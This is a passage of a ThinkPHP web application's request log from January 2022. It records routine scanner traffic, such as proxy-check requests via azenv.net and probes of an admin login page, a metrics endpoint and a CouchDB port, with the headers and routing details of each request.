  'connection' => 'keep-alive',
  'cookie' => 'PHPSESSID=b8c3r37fek4o5vus9vi1jpiauv',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'max-age=0',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T17:02:47+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004132s] [吞吐率：242.03req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T17:02:49+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003703s] [吞吐率：270.06req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T17:29:17+08:00 ] 83.97.20.34 GET 113.116.132.17:8081/
[运行时间：0.003913s] [吞吐率：255.56req/s] [内存消耗：488.73kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T18:02:46+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.007672s] [吞吐率：130.34req/s] [内存消耗：489.88kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T18:02:47+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003879s] [吞吐率：257.81req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T19:03:03+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.003660s] [吞吐率：273.23req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T19:03:03+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.006999s] [吞吐率：142.88req/s] [内存消耗：486.59kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T20:00:38+08:00 ] 161.189.192.94 GET 192.168.3.105:8081/metrics?pretty=true
[运行时间：0.004640s] [吞吐率：215.51req/s] [内存消耗：496.73kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '192.168.3.105:8081',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/metrics' => '',
  'pretty' => 'true',
)
---------------------------------------------------------------
[ 2022-01-04T20:02:33+08:00 ] 161.189.192.94 GET 192.241.144.117:5984/
[运行时间：0.004086s] [吞吐率：244.74req/s] [内存消耗：488.88kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '192.241.144.117:5984',
  'user-agent' => 'curl/7.64.1',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T20:02:44+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.003922s] [吞吐率：254.97req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T20:02:45+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003356s] [吞吐率：297.95req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T20:06:07+08:00 ] 161.189.192.94 GET 186.67.164.197:8088/unified-console.html
[运行时间：0.004343s] [吞吐率：230.25req/s] [内存消耗：497.98kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '186.67.164.197:8088',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/unified-console_html' => '',
)
---------------------------------------------------------------
[ 2022-01-04T20:26:47+08:00 ] 128.1.248.26 GET 113.116.132.17:8081/
[运行时间：0.007289s] [吞吐率：137.19req/s] [内存消耗：490.41kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T20:26:47+08:00 ] 128.1.248.26 GET 113.116.132.17:8081/padmin/adminlogin/index.html
[运行时间：0.005493s] [吞吐率：182.05req/s] [内存消耗：486.34kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'accept' => '*/*',
  'referer' => 'http://113.116.132.17:8081/',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T21:02:53+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004176s] [吞吐率：239.47req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T21:02:54+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003364s] [吞吐率：297.26req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T22:03:27+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.003920s] [吞吐率：255.10req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T22:03:29+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003860s] [吞吐率：259.07req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T22:06:17+08:00 ] 104.140.188.42 GET 113.116.132.17:8081/
[运行时间：0.004332s] [吞吐率：230.84req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'https://gdnplus.com:Gather Analyze Provide.',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T22:06:18+08:00 ] 104.140.188.42 GET 113.116.132.17:8081/padmin/adminlogin/index.html
[运行时间：0.004291s] [吞吐率：233.04req/s] [内存消耗：485.65kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.116.132.17:8081',
  'user-agent' => 'Go http package',
  'referer' => 'http://113.116.132.17:8081/',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2022-01-04T23:02:57+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/
[运行时间：0.004033s] [吞吐率：247.95req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2022-01-04T23:02:58+08:00 ] 91.194.84.88 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003426s] [吞吐率：291.88req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
